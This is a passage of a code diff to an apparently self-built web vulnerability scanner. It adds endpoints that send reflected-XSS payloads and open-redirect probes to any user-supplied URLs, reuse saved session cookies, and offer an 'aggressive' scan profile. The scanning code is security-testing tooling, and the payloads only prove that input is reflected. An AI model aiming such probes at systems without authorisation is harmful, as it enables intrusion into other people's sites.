+        finding = { 'vuln_type': vuln_type, 'evidence': evidence, 'payload': payload, 'url': '' }
+        import asyncio as _asyncio
+        loop = _asyncio.new_event_loop()
+        _asyncio.set_event_loop(loop)
+        verdict = loop.run_until_complete(ai.ai_validate_finding(finding))
+        loop.close()
+        if not verdict:
+            return jsonify({"success": False, "error": "ai_unavailable"}), 503
+        # Store as verification record
+        import json as _json
+        details = _json.dumps(verdict, ensure_ascii=False)
+        manager.add_verification_record(vuln_id, method='ai_verdict', marker='gemini_flash', details=details)
+        return jsonify({"success": True, **verdict})
+    except Exception as e:
+        app.logger.error(f"AI revalidate error: {e}")
+        return jsonify({"success": False, "error": str(e)}), 500
+
 @app.route('/api/exploit-screenshots', methods=['GET'])
 def list_exploit_screenshots():
     """List all exploit proof screenshots available."""
@@ -1938,9 +2535,15 @@ def scan_unauth():
 
 @app.route('/api/scan/direct', methods=['POST'])
 def direct_url_scan():
-    """Direct vulnerability testing on specific URLs using consolidated vulnerability scanner"""
+    """Universal direct URL vulnerability testing.
+
+    - Accepts any list of HTTP/HTTPS URLs.
+    - Runs lightweight, technology-agnostic checks (starting with reflected XSS payload reflection) without target assumptions.
+    - Defaults to non-blocking mode (fire-and-forget) to avoid API hangs; optional blocking with return_results=true.
+    """
     try:
-        data = request.get_json()
+        # Be tolerant to malformed JSON: silent=True avoids raising BadRequest
+        data = request.get_json(silent=True)
         if not data:
             return jsonify({"success": False, "error": "No JSON data provided"}), 400
             
@@ -1952,293 +2555,576 @@ def direct_url_scan():
             return jsonify({"success": False, "error": "No URLs provided"}), 400
             
         auth_enabled = data.get('auth_enabled', False)
+
+        # Build a universal per-host cookie map from saved sessions
+        # This ensures Direct URL Testing reuses the same cookies as the engine/UI
+        from urllib.parse import urlsplit
+        cookie_map = {}
+        try:
+            with sqlite3.connect(app.config['database_path']) as _db:
+                _rows = _db.execute("SELECT domain, cookie FROM cookies").fetchall()
+                for d, c in _rows:
+                    if not c:
+                        continue
+                    d = (d or '').strip()
+                    if not d:
+                        continue
+                    # Normalize any stored value (domain or full URL) to a host
+                    if d.startswith('http://') or d.startswith('https://'):
+                        try:
+                            host = urlsplit(d).netloc.lower()
+                        except Exception:
+                            host = d.lower()
+                    else:
+                        host = d.lower()
+                    if host:
+                        # last-write wins; table is per-domain so this is fine
+                        cookie_map[host] = c
+        except Exception as _e:
+            app.logger.debug(f"Cookie map load failed: {_e}")
+
+        # Helper: per-request cookie injector using aiohttp TraceConfig
+        import aiohttp
+        cookie_used_hosts = set()
+        trace = aiohttp.TraceConfig()
+
+        async def _on_request_start(session, trace_config_ctx, params):
+            try:
+                host = urlsplit(str(params.url)).netloc.lower()
+                ck = cookie_map.get(host)
+                if ck:
+                    # Copy to avoid mutating shared headers
+                    new_headers = dict(params.headers or {})
+                    new_headers['Cookie'] = ck
+                    params.headers = new_headers
+                    if host not in cookie_used_hosts:
+                        cookie_used_hosts.add(host)
+                        app.logger.info(f"🔐 Direct testing: using saved cookies for {host}")
+            except Exception:
+                pass
+
+        # Correct registration for aiohttp TraceConfig
+        trace.on_request_start.append(_on_request_start)
         
-        # Use the main vulnerability scanner for direct URL testing
-        from modules.vulnerability_scanner import VulnerabilityScanner
+        # Universal scanning: support deep (full engine) and quick (preflight) modes.
         from asset_manager import AssetManager
         import asyncio
         import aiohttp
         import os
-        
-        # Set environment flag for direct URL testing
+
+        # Optional: mark environment for other subsystems that may observe this flag
         os.environ['MODSCAN_DIRECT_URL_TESTING'] = '1'
-        
-        async def run_direct_scan():
-            """WORKING direct scan - use the same logic as our successful standalone test"""
-            app.logger.info("🚨 DIRECT SCAN FUNCTION CALLED!")
-            print("🚨 DIRECT SCAN FUNCTION CALLED!")
-            
-            from urllib.parse import urlparse
+
+        async def run_direct_scan_quick(target_urls):
+            """Preflight universal probes (reflected XSS + open redirect). Optional adjunct to deep mode.
+
+            Small concurrency + per-URL timeouts; does not replace deep engine scans.
+            """
             from asset_manager import VulnerabilityFinding
             from datetime import datetime
-            
+
+            app.logger.info(f"🚨 DIRECT-QUICK START urls={len(target_urls)}")
+            try:
+                from asset_manager import AssetManager as _AM
+                _AM().notify_change(
+                    message="Direct scan started",
+                    payload={"mode": "quick", "urls": len(target_urls)},
+                    ntype="direct_scan"
+                )
+            except Exception:
+                pass
+
             asset_manager = AssetManager()
             findings_count = 0
-            
-            # DIRECT XSS TESTING - Same as our working standalone test
-            async with aiohttp.ClientSession() as session:
-                for url in urls:
-                    app.logger.info(f"🚨 DIRECT XSS TEST: {url}")
-                    
-                    try:
-                        # Simple XSS test - same as working standalone
-                        test_url = f"{url}?name=<script>alert('XSS')</script>"
-                        
-                        timeout = aiohttp.ClientTimeout(total=10)
-                        async with session.get(test_url, timeout=timeout) as response:
-                            if response.status == 200:
-                                content = await response.text()
-                                app.logger.info(f"🚨 Response length: {len(content)}")
-                                
-                                # Check if payload is reflected - EXACT SAME LOGIC
-                                if "<script>alert('XSS')</script>" in content:
-                                    app.logger.info(f"🚨 XSS FOUND: Script reflected unescaped!")
-                                    
-                                    finding = VulnerabilityFinding(
-                                        url=test_url,
-                                        vuln_type="XSS",
-                                        severity="High",
-                                        confidence=0.95,
-                                        payload="name=<script>alert('XSS')</script>",
-                                        evidence="XSS payload reflected unescaped in response",
-                                        discovered_at=datetime.now(),
-                                        impact_description="XSS vulnerability allows execution of arbitrary JavaScript",
-                                        remediation="Implement proper input validation and output encoding",
-                                        affected_parameter="name"
-                                    )
-                                    
-                                    # Store in database - same as standalone test
-                                    asset_manager.add_vulnerability_finding(finding, 1)
-                                    findings_count += 1
-                                    app.logger.info(f"🚨 XSS vulnerability stored!")
+
+            # Concurrency and timeouts
+            concurrency = int(os.environ.get('MODSCAN_DIRECT_CONCURRENCY', '5'))
+            per_url_timeout = float(os.environ.get('MODSCAN_DIRECT_TIMEOUT', '8'))
+            connector = aiohttp.TCPConnector(limit=concurrency * 2, ssl=False)
+            timeout = aiohttp.ClientTimeout(total=per_url_timeout)
+            sem = asyncio.Semaphore(concurrency)
+
+            # Expanded universal payloads (context-agnostic)
+            payloads = [
+                "<script>alert('XSS')</script>",
+                "\"<svg/onload=alert(1)>",
+                "'-(alert(1))-'"
+            ]
+            test_params_default = ['name','q','search','s','id']
+            redirect_candidates = ['next','url','u','redirect','dest','target','return','goto','to','continue','redirect_to']
+
+            async with aiohttp.ClientSession(connector=connector, timeout=timeout, trace_configs=[trace]) as session:
+                async def scan_one(raw_url: str):
+                    nonlocal findings_count
+                    async with sem:
+                        url = raw_url.strip()
+                        if not url:
+                            return
+                        try:
+                            # Discover candidate parameter names from the page (universal)
+                            discovered_params = []
+                            discovered_submit = None
+                            try:
+                                async with session.get(url, allow_redirects=True) as r0:
+                                    base_html = ''
+                                    if r0.status == 200:
+                                        try:
+                                            base_html = await r0.text()
+                                        except Exception:
+                                            base_html = (await r0.read()).decode('utf-8', errors='ignore')
+                                    if base_html:
+                                        # Light regex discovery to avoid heavy deps
+                                        import re as _re
+                                        for m in _re.finditer(r'name=[\"\']([a-zA-Z0-9_\-]{1,32})[\"\']', base_html):
+                                            nm = m.group(1)
+                                            if nm and nm.lower() not in discovered_params:
+                                                discovered_params.append(nm.lower())
+                                        # Look for common submit markers
+                                        for cand in ['submit','action','do','send']:
+                                            if cand in base_html.lower():
+                                                discovered_submit = discovered_submit or cand
+                            except Exception:
+                                pass
+
+                            # Build param set: discovered + defaults (limit for prudence)
+                            param_names = list(dict.fromkeys((discovered_params or []) + test_params_default))[:8]
+
+                            # Try multiple payloads and candidate param names
+                            reflected = False
+                            for p in payloads:
+                                for param in param_names:
+                                    sep = '&' if '?' in url else '?'
+                                    test_url = f"{url}{sep}{param}={p}"
+                                    # Add a submit-like marker if none present in the query and discovered
+                                    if discovered_submit and discovered_submit not in test_url.lower():
+                                        test_url += f"&{discovered_submit}=1"
+                                    app.logger.info(f"🚨 DIRECT XSS TEST: {test_url}")
+                                    async with session.get(test_url, allow_redirects=True) as response:
+                                        if response.status != 200:
+                                            continue
+                                        try:
+                                            content = await response.text()
+                                        except Exception:
+                                            content = (await response.read()).decode('utf-8', errors='ignore')
+                                        if p in content:
+                                            reflected = True
+                                            finding = VulnerabilityFinding(
+                                                url=test_url,
+                                            vuln_type="XSS",
+                                            severity="High",
+                                            confidence=0.95,
+                                            payload=f"{param}={p}",
+                                            evidence="Reflected payload present in response",
+                                            discovered_at=datetime.now(),
+                                            impact_description="Reflected XSS enables arbitrary JavaScript execution",
+                                            remediation="Validate inputs and contextually encode outputs",
+                                            affected_parameter=param
+                                        )
+                                        try:
+                                            from urllib.parse import urlparse as _urlparse
+                                            parsed = _urlparse(url)
+                                            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                                            # Ensure we have an asset row for linkage
+                                            existing = asset_manager.get_asset_by_url(base)
+                                            if existing and existing.get('id'):
+                                                asset_id = existing['id']
+                                            else:
+                                                asset_id = asset_manager.add_asset(base, parsed.netloc, 'direct_scan') or 0
+                                            asset_manager.add_vulnerability_finding(finding, int(asset_id) if asset_id else 0)
+                                        except Exception:
+                                            # Fallback to asset_id=0 (unknown) if asset table unavailable
+                                            asset_manager.add_vulnerability_finding(finding, 0)
+                                        try:
+                                            asset_manager.notify_change(
+                                                message="Vulnerability found",
+                                                payload={
+                                                    "type": finding.vuln_type,
+                                                    "url": finding.url,
+                                                    "severity": finding.severity,
+                                                    "evidence": finding.evidence,
+                                                },
+                                                ntype="vulnerability"
+                                            )
+                                        except Exception:
+                                            pass
+                                        findings_count += 1
+                                        app.logger.info(f"🚨 XSS FOUND + STORED: {test_url}")
+                                    if reflected:
+                                        break
+                                if reflected:
+                                    break
+
+                            # Universal Open Redirect probe (no target assumptions)
+                            try:
+                                from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
+                                sp = urlsplit(url)
+                                q = dict(parse_qsl(sp.query, keep_blank_values=True))
+                                if not q:
+                                    # add a param if none present
+                                    q[redirect_candidates[0]] = 'http://example.com/'
                                 else:
-                                    app.logger.info(f"🚨 XSS: Payload not reflected")
-                    except Exception as e:
-                        app.logger.error(f"🚨 XSS test failed for {url}: {e}")
-            
-            return findings_count
-        
-        # Skip the complex scanner system for now
-        if False:  # Disable complex scanner
-            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10, sock_connect=2, sock_read=8)) as session:
-                try:
-                    test_url = assets[0]['url']
-                    app.logger.info(f"HTTP GET start: {test_url} t=8s [direct]")
-                    async with session.get(test_url, allow_redirects=True) as r:
-                        app.logger.info(f"🚨 PAGE RESPONSE HEADERS: {getattr(r, 'status', '?')} [direct]")
-                        try:
-                            import asyncio as _async
-                            async def _read():
-                                return await r.text()
-                            body = await _async.wait_for(_read(), timeout=8.0)
-                        except Exception:
-                            body = ''
-                        try:
-                            # Universal form parsing for visibility
-                            from modules.universal_form_parser import parse_forms
-                            forms = parse_forms(body or '', base_url=test_url) or []
-                            app.logger.info(f"🚨 PARSED FORMS: Found {len(forms)} forms [direct]")
-                        except Exception:
-                            pass
-                        app.logger.info(f"🚨 PAGE RESPONSE: {r.status} - Content length: {len((body or '').encode('utf-8'))} [direct]")
-                except Exception as _e:
-                    app.logger.error(f"🚨 PAGE FETCH ERROR [direct]: {_e}")
-                
-                # Now run the full scanner against the assets
-                results = await scanner.scan_assets_for_vulnerabilities(assets, session)
-                return len([f for sublist in results for f in sublist])
-        
-        # Run the async scan
-        try:
-            vulnerability_count = asyncio.run(run_direct_scan())
-        finally:
-            # Clean up environment flag
-            os.environ.pop('MODSCAN_DIRECT_URL_TESTING', None)
-        
-        # Return success response
-        return jsonify({
-            "success": True,
-            "message": f"Added {len(urls)} URLs and started vulnerability testing",
-            "urls_added": len(urls),
-            "vulnerabilities_found": vulnerability_count,
-            "auth_results": [f"🚀 Started {'authenticated' if auth_enabled else 'unauthenticated'} vulnerability scanning"]
-        })
-        
-        results = []
-        added_count = 0
-        
-        with sqlite3.connect(app.config['database_path']) as db:
-            for url in urls:
-                try:
-                    parsed = urlparse(url)
-                    domain = parsed.netloc
-                    base_url = f"{parsed.scheme}://{domain}"
-                    
-                    # Handle authentication if credentials provided
-                    session_cookies = ''
-                    if credentials and credentials.get('username') and credentials.get('password'):
-                        try:
-                            # Use provided login_url or fallback to base_url
-                            login_url = credentials.get('login_url', base_url)
-                            
-                            # Perform login using existing login function
-                            session = requests.Session()
-                            response = session.get(login_url, timeout=10, verify=False)
-                            if response.status_code == 200:
-                                # Look for CSRF token
-                                csrf_token = None
-                                if 'user_token' in response.text:
-                                    import re
-                                    token_match = re.search(r'name=["\']user_token["\'] value=["\']([^"\']+)["\']', response.text)
-                                    if token_match:
-                                        csrf_token = token_match.group(1)
-                                
-                                # Prepare login data
-                                login_data = {
-                                    'username': credentials['username'],
-                                    'password': credentials['password'],
-                                    'Login': 'Login'
-                                }
-                                
-                                if csrf_token:
-                                    login_data['user_token'] = csrf_token
-                                
-                                # Submit login
-                                login_response = session.post(login_url, data=login_data, timeout=10, verify=False)
-                                
-                                # Check for successful login indicators
-                                if (login_response.status_code == 200 and
-                                    ('welcome' in login_response.text.lower() or
-                                     'dashboard' in login_response.text.lower() or
-                                     'logout' in login_response.text.lower() or
-                                     'vulnerabilities' in login_response.text.lower())):
-                                    
-                                    # Extract cookies
-                                    cookies = {}
-                                    for cookie in session.cookies:
-                                        cookies[cookie.name] = cookie.value
-                                    
-                                    # Apply security level override for DVWA
-                                    if 'security' in cookies and 'dvwa' in login_url.lower():
-                                        cookies['security'] = 'low'  # Force security to low for testing
-                                    
-                                    session_cookies = '; '.join([f"{name}={value}" for name, value in cookies.items()])
-                                    results.append(f"✅ Logged in to {domain}")
-                                else:
-                                    results.append(f"⚠️ Login failed for {domain}")
-                            else:
-                                results.append(f"⚠️ Could not access login page for {domain}")
-                                
+                                    # overwrite any known redirect-like param
+                                    for cand in redirect_candidates:
+                                        if cand in q or cand.lower() in q:
+                                            q[cand] = 'http://example.com/'
+                                            break
+                                    else:
+                                        q[redirect_candidates[0]] = 'http://example.com/'
+                                rq = urlencode(q, doseq=True)
+                                rtest = urlunsplit((sp.scheme, sp.netloc, sp.path, rq, sp.fragment))
+                                async with session.get(rtest, allow_redirects=False) as r:
+                                    loc = r.headers.get('Location', '')
+                                    if r.status in (301,302,303,307,308) and loc.startswith('http') and 'example.com' in loc:
+                                        finding = VulnerabilityFinding(
+                                            url=rtest,
+                                            vuln_type="OPEN_REDIRECT",
+                                            severity="Medium",
+                                            confidence=0.8,
+                                            payload=f"redirect=http://example.com/",
+                                            evidence=f"3xx to {loc}",
+                                            discovered_at=datetime.now(),
+                                            impact_description="Unvalidated redirect can be abused for phishing and token theft",
+                                            remediation="Validate and whitelist redirect destinations; use relative paths only",
+                                            affected_parameter=""
+                                        )
+                                        try:
+                                            existing = asset_manager.get_asset_by_url(f"{sp.scheme}://{sp.netloc}{sp.path}")
+                                            if existing and existing.get('id'):
+                                                asset_id = existing['id']
+                                            else:
+                                                asset_id = asset_manager.add_asset(f"{sp.scheme}://{sp.netloc}{sp.path}", sp.netloc, 'direct_scan') or 0
+                                            asset_manager.add_vulnerability_finding(finding, int(asset_id) if asset_id else 0)
+                                            findings_count += 1
+                                            asset_manager.notify_change(
+                                                "Vulnerability found",
+                                                {"type": finding.vuln_type, "url": finding.url, "severity": finding.severity, "evidence": finding.evidence},
+                                                ntype="vulnerability"
+                                            )
+                                            app.logger.info(f"🚨 OPEN REDIRECT FOUND + STORED: {rtest} -> {loc}")
+                                        except Exception as _e:
+                                            app.logger.error(f"Open redirect store error: {_e}")
+                            except Exception as _e:
+                                app.logger.debug(f"Open redirect probe error: {_e}")
                         except Exception as e:
-                            results.append(f"⚠️ Login error for {domain}: {str(e)}")
-                    
-                    # Apply locked cookies if provided
-                    if locked_cookies:
-                        # Parse and merge cookies
-                        if session_cookies:
-                            existing_dict = {}
-                            for cookie in session_cookies.split(';'):
-                                cookie = cookie.strip()
-                                if '=' in cookie:
-                                    name, value = cookie.split('=', 1)
-                                    existing_dict[name.strip()] = value.strip()
-                        else:
-                            existing_dict = {}
-                        
-                        # Apply locked cookies (override existing)
-                        for cookie in locked_cookies.split(';'):
-                            cookie = cookie.strip()
-                            if '=' in cookie:
-                                name, value = cookie.split('=', 1)
-                                existing_dict[name.strip()] = value.strip()
-                        
-                        session_cookies = '; '.join([f"{name}={value}" for name, value in existing_dict.items()])
-                        results.append(f"🔒 Applied locked cookies for {domain}")
-                    
-                    # Add as asset to database
-                    db.execute("""
-                        INSERT OR REPLACE INTO assets (url, host, discovered_at, status_code, title, tech_stack) 
-                        VALUES (?, ?, datetime('now'), NULL, 'Direct URL Test', 'Manual Entry')
-                    """, (url, domain))
-                    added_count += 1
-                    
-                    # Store cookies and auth policy in database if we have them
-                    if session_cookies:
-                        username = credentials.get('username', '') if credentials else ''
-                        password = credentials.get('password', '') if credentials else ''
-                        
-                        # Create auth policy for auto-refresh  
-                        auth_policy = {
-                            'auto_refresh': data.get('auto_refresh', False),
-                            'locked_cookies': locked_cookies,
-                            'login_url': credentials.get('login_url', f"{base_url}/login.php"),
-                            'username_field': 'username',
-                            'password_field': 'password'
-                        }
-                        
-                        # Store in cookies table
-                        db.execute("""
-                            INSERT OR REPLACE INTO cookies 
-                            (domain, cookie, persistent, auth_keys, policy, last_updated) 
-                            VALUES (?, ?, ?, ?, ?, datetime('now'))
-                        """, (domain, session_cookies, f'username:{username}', f'password:{password}', 
-                             json.dumps(auth_policy)))
-                    
-                except Exception as e:
-                    results.append(f"❌ Error processing {url}: {str(e)}")
-                    continue
-                    
-            db.commit()
-        
-        # After adding URLs, trigger authenticated vulnerability scanning
-        if added_count > 0:
+                            app.logger.error(f"🚨 Direct test failed for {url}: {e}")
+
+                tasks = [asyncio.create_task(scan_one(u)) for u in target_urls]
+                await asyncio.gather(*tasks, return_exceptions=True)
+
+            app.logger.info(f"✅ DIRECT-QUICK DONE findings={findings_count}")
             try:
-                # Get the domain from the first URL for scanning
-                first_domain = urlparse(urls[0]).netloc if urls else None
-                
-                if first_domain:
-                    # Set up environment for authenticated engine scan
-                    env = os.environ.copy()
-                    # Ensure process guard is active
-                    env.pop('MODSCAN_SKIP_PROCESS_GUARD', None)
-                    env['MODSCAN_AUTH_DOMAIN'] = first_domain
-                    env['MODSCAN_TTL_HOURS'] = '0'  # Force fresh scan
-                    env['MODSCAN_DIRECT_URL_TESTING'] = '1'  # Skip discovery, test only provided URLs
-                    env['MODSCAN_VULN_VERBOSE'] = '1'  # Show detailed Tier 3 progress
-                    env['MODSCAN_FORCE_REFRESH_EVERY_URL'] = '1'  # Strict targets: refresh auth per URL
-                    # Pass the exact URLs the user submitted so the engine scans them first
+                from asset_manager import AssetManager as _AM
+                _AM().notify_change(
+                    message="Direct scan completed",
+                    payload={"mode": "quick", "urls": len(target_urls), "findings": findings_count},
+                    ntype="direct_scan"
+                )
+            except Exception:
+                pass
+            return findings_count
+
+        async def run_direct_scan_deep(target_urls, profile: str = 'normal'):
+            """Deep, in-depth universal scan using VulnerabilityScanner on provided URLs as assets.
+
+            This is the same engine used for discovered assets, ensuring parity.
+            """
+            from modules.vulnerability_scanner import VulnerabilityScanner
+            from urllib.parse import urlparse as _urlparse
+
+            am = AssetManager()
+            # Ensure assets exist and capture their IDs
+            assets = []
+            try:
+                from asset_manager import AssetManager as _AM
+                _AM().notify_change(
+                    message="Direct scan started",
+                    payload={"mode": "deep", "urls": len(target_urls), "profile": profile},
+                    ntype="direct_scan"
+                )
+            except Exception:
+                pass
+            for raw in target_urls:
+                try:
+                    u = raw.strip()
+                    if not u:
+                        continue
+                    pu = _urlparse(u)
+                    host = pu.netloc
+                    asset_id = am.add_asset(u, host, 'direct_scan') or 0
+                    assets.append({
+                        'id': int(asset_id) if asset_id else 0,
+                        'url': u,
+                        'host': host,
+                        'status_code': 200,
+                        'discovery_method': 'direct_scan'
+                    })
+                except Exception as e:
+                    app.logger.error(f"Asset prep failed for {raw}: {e}")
+
+            if not assets:
+                return 0
+
+            # Build AUTH-aware config for the scanner (universal). If many hosts, pick most common.
+            try:
+                from collections import Counter
+                hosts = [a.get('host') for a in assets if a.get('host')]
+                main_host = Counter(hosts).most_common(1)[0][0] if hosts else ''
+            except Exception:
+                main_host = ''
+
+            AUTH_CONFIG = CONFIG.copy()
+            # Optional: pass user-selected test categories from request
+            try:
+                selected_tests = data.get('tests') or []
+                if isinstance(selected_tests, list):
+                    AUTH_CONFIG['tests'] = [str(t).lower() for t in selected_tests]
+            except Exception:
+                pass
+            # If we have a cookie for the primary host, set it so external tools (sqlmap/dalfox) receive it
+            if main_host and main_host in cookie_map and cookie_map.get(main_host):
+                AUTH_CONFIG['auth_cookie'] = cookie_map.get(main_host)
+                AUTH_CONFIG['auth_domain'] = main_host
+                app.logger.info(f"🔐 Direct-deep: providing auth_cookie for {main_host} to VulnerabilityScanner")
+            scanner = VulnerabilityScanner(am, AUTH_CONFIG)
+            # Keep connector modest to avoid overwhelming small targets; scanner has its own concurrency
+            profile_key = (profile or 'normal').lower()
+            # Map profiles to reasonable connector + semaphore limits
+            prof_map = {
+                'stealth': {'conn': 20, 'sem': 100},
+                'normal':  {'conn': 50, 'sem': 500},
+                'aggressive': {'conn': 150, 'sem': 1500}
+            }
+            p = prof_map.get(profile_key, prof_map['normal'])
+            connector = aiohttp.TCPConnector(limit=p['conn'], ssl=False)
+            timeout = aiohttp.ClientTimeout(total=None)  # deep scans manage their own per-request timeouts
+            # Attach trace to inject per-host cookies into every request
+            async with aiohttp.ClientSession(connector=connector, timeout=timeout, trace_configs=[trace]) as session:
+                try:
+                    results = await scanner.scan_assets_for_vulnerabilities(assets, session, semaphore_limit=p['sem'])
+                except Exception as e:
+                    app.logger.error(f"Deep scan error: {e}")
+                    results = []
+            try:
+                # Count findings from results (engine stores them internally already)
+                count = sum(len(lst) for lst in results if isinstance(lst, list))
+                try:
+                    from asset_manager import AssetManager as _AM
+                    _AM().notify_change(
+                        message="Direct scan completed",
+                        payload={"mode": "deep", "urls": len(target_urls), "profile": profile, "findings": count},
+                        ntype="direct_scan"
+                    )
+                except Exception:
+                    pass
+                return count
+            except Exception:
+                return 0
+        
+        # Legacy complex path removed to keep endpoint lean and non-blocking.
+        
+        # Decide mode: deep (default) vs quick adjunct
+        deep = True if str(data.get('deep', 'true')).lower() in ('1','true','yes','on') else False
+        # Default profile from saved global profile
+        try:
+            from pathlib import Path as _Path
+            import json as _json
+            _prof_path = _Path(__file__).resolve().parent / 'scan_profile.json'
+            _prof = 'normal'
+            if _prof_path.exists():
+                _data = _json.loads(_prof_path.read_text(encoding='utf-8') or '{}')
+                _prof = (_data.get('profile') or 'normal').lower()
+        except Exception:
+            _prof = 'normal'
+        profile = (data.get('profile') or _prof).lower()
+        quick_also = True if str(data.get('quick_probe', 'false')).lower() in ('1','true','yes','on') else False
+        force_refresh = True if str(data.get('force_refresh', 'false')).lower() in ('1','true','yes','on') else False
+        use_minimized_cookie = True if str(data.get('use_minimized_cookie', 'false')).lower() in ('1','true','yes','on') else False
+
+        # Decide blocking vs non-blocking behavior
+        return_results = bool(data.get('return_results', False))
+
+        # Helper to run async refresh synchronously
+        def _run_force_refresh(auth_manager, host, pol):
+            try:
+                import asyncio as _a
+                async def _do():
+                    return await auth_manager.refresh_session(host, pol)
+                try:
+                    loop = _a.get_event_loop()
+                except RuntimeError:
+                    loop = _a.new_event_loop(); _a.set_event_loop(loop)
+                if loop.is_running():
+                    fut = _a.ensure_future(_do())
+                    # Not ideal to block, but direct endpoint can run in a background thread
+                    return _a.get_event_loop().run_until_complete(fut)
+                return loop.run_until_complete(_do())
+            except Exception:
+                return None
+
+        # Optional: force refresh of session cookies before scanning (universal)
+        if force_refresh:
+            try:
+                from modules.auth_manager import AuthManager
+                am = AuthManager(AssetManager(), CONFIG)
+                # Refresh for primary host detected in URLs
+                from urllib.parse import urlparse as _urlparse
+                hosts = []
+                for u in urls:
                     try:
-                        import json as _json
-                        env['MODSCAN_DIRECT_URLS'] = _json.dumps(urls)
+                        hosts.append(_urlparse(u).netloc.lower())
                     except Exception:
-                        env['MODSCAN_DIRECT_URLS'] = '\n'.join(urls)
-                    # Only scan the provided URLs
-                    env['MODSCAN_ONLY_DIRECT_URLS'] = '1'
-                    # One-shot: exit after direct pass
-                    env['MODSCAN_SINGLE_SHOT'] = '1'
-                    # Enable strict IDOR comparison
-                    env['MODSCAN_IDOR_STRICT'] = '1'
-                    # Stabilize small targets: lower inline concurrency (can be adjusted later via UI)
-                    env['MODSCAN_INLINE_CONCURRENCY'] = '1'
-                    
-                    # Log environment variables for debugging
-                    app.logger.info(f"🔧 Direct URL Testing - Setting env vars: MODSCAN_DIRECT_URL_TESTING=1, MODSCAN_AUTH_DOMAIN={first_domain}")
-                    
-                    # Start the engine with authentication for this domain
-                    subprocess.Popen(['python3', 'engine.py'], env=env, cwd='/home/michael/recon-platform/modscan')
-                    results.append(f"🚀 Started authenticated vulnerability scanning for {first_domain}")
-            except Exception as e:
-                results.append(f"⚠️ Failed to start vulnerability scan: {str(e)}")
-            
-        return jsonify({
-            "success": True, 
-            "message": f"Added {added_count} URLs and started vulnerability testing",
-            "urls_added": added_count,
-            "auth_results": results
-        })
+                        pass
+                primary = hosts[0] if hosts else ''
+                if primary:
+                    pol_cookie, pol = am.load_policy(primary)
+                    if pol:
+                        new_cookie = _run_force_refresh(am, primary, pol)
+                        if new_cookie:
+                            cookie_map[primary] = new_cookie
+                            app.logger.info(f"🔄 Direct: refreshed session for {primary}")
+            except Exception as _e:
+                app.logger.debug(f"Force refresh error: {_e}")
+
+        # Optional: use minimized cookie only if configured or persistent/auth_keys defined
+        if use_minimized_cookie and cookie_map:
+            try:
+                minimized = {}
+                import json as _json
+                with sqlite3.connect(app.config['database_path']) as _db:
+                    for host, ck in cookie_map.items():
+                        keep = []
+                        row = _db.execute("SELECT persistent, auth_keys FROM cookies WHERE domain LIKE ? OR domain=? ORDER BY last_updated DESC LIMIT 1", (f"%{host}%", host)).fetchone()
+                        if row:
+                            try:
+                                kp = row[0]
+                                ak = row[1]
+                                if isinstance(kp, str):
+                                    kp = _json.loads(kp)
+                                if isinstance(ak, str):
+                                    ak = _json.loads(ak)
+                                keep = [*(kp or []), *(ak or [])]
+                            except Exception:
+                                keep = []
+                        # Fallback heuristic for universal auth/session keys
+                        if not keep:
+                            keep = ['phpsessid','session','sess','auth','token','csrftoken','xsrf','jwt','remember']
+                        try:
+                            from modules.auth_manager import AuthManager as _AM
+                            minimized_cookie = _AM.minimize_cookie(ck, keep)
+                        except Exception:
+                            minimized_cookie = ck
+                        minimized[host] = minimized_cookie
+                # Replace map + note
+                cookie_map.update(minimized)
+                app.logger.info("✂️ Direct: using minimized cookies for scan")
+            except Exception as _e:
+                app.logger.debug(f"Minimize-cookie error: {_e}")
+
+        if return_results:
+            # Blocking: run and return counts (uses concurrency + timeouts to avoid long hangs)
+            try:
+                if deep:
+                    v_deep = asyncio.run(run_direct_scan_deep(urls, profile=profile))
+                else:
+                    v_deep = 0
+                v_quick = asyncio.run(run_direct_scan_quick(urls)) if quick_also else 0
+                vulnerability_count = (v_deep or 0) + (v_quick or 0)
+            finally:
+                os.environ.pop('MODSCAN_DIRECT_URL_TESTING', None)
+            return jsonify({
+                "success": True,
+                "mode": "blocking",
+                "depth": "deep" if deep else "quick",
+                "profile": profile,
+                "message": f"Completed direct testing for {len(urls)} URLs",
+                "urls_processed": len(urls),
+                "vulnerabilities_found": vulnerability_count,
+                "auth_results": [f"🚀 Started {'authenticated' if auth_enabled else 'unauthenticated'} vulnerability testing"]
+            })
+        else:
+            # Non-blocking: schedule in background thread and return immediately
+            import threading
+
+            def _runner():
+                try:
+                    if deep:
+                        asyncio.run(run_direct_scan_deep(urls, profile=profile))
+                    if quick_also:
+                        asyncio.run(run_direct_scan_quick(urls))
+                except Exception as e:
+                    app.logger.error(f"Background direct scan error: {e}")
+                finally:
+                    os.environ.pop('MODSCAN_DIRECT_URL_TESTING', None)
+
+            threading.Thread(target=_runner, daemon=True).start()
+
+            return jsonify({
+                "success": True,
+                "mode": "async_started",
+                "depth": "deep" if deep else "quick",
+                "profile": profile,
+                "message": f"Started direct testing for {len(urls)} URLs",
+                "urls_received": len(urls),
+                "vulnerabilities_found": None,
+                "auth_results": [f"🚀 Started {'authenticated' if auth_enabled else 'unauthenticated'} vulnerability testing"]
+            })
+        # Note: Legacy engine launch and DB insert path removed in favor of
+        # lean, universal direct testing above. Auth/engine orchestration lives
+        # in dedicated endpoints to keep this path predictable and fast.
         
     except Exception as e:
         app.logger.error(f"Direct scan error: {e}")
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route('/api/assets/import', methods=['POST'])
+def import_assets():
+    """Bulk import assets from a list of URLs (universal).
+
+    Payload JSON:
+      { "urls": ["https://host/a", ...], "discovery_method": "ultimate_discovery" }
+
+    - Inserts rows into assets if not present; updates host and discovery_method.
+    - Does not trigger scanning by itself. Pair with /api/scanner/policy and /api/restart_services or call /api/scan/direct.
+    """
+    try:
+        data = request.get_json(silent=True) or {}
+        urls = data.get('urls') or []
+        if isinstance(urls, str):
+            urls = [u.strip() for u in urls.strip().split('\n') if u.strip()]
+        if not isinstance(urls, list) or not urls:
+            return jsonify({"success": False, "error": "No URLs provided"}), 400
+        method = (data.get('discovery_method') or 'ultimate_discovery').strip() or 'ultimate_discovery'
+        from urllib.parse import urlparse as _urlparse
+        added = 0
+        from asset_manager import AssetManager as _AM
+        am = _AM()
+        for raw in urls:
+            try:
+                u = str(raw).strip()
+                if not u:
+                    continue
+                pu = _urlparse(u)
+                host = pu.netloc
+                if not host:
+                    continue
+                am.add_asset(u, host, method)
+                added += 1
+            except Exception as _e:
+                try:
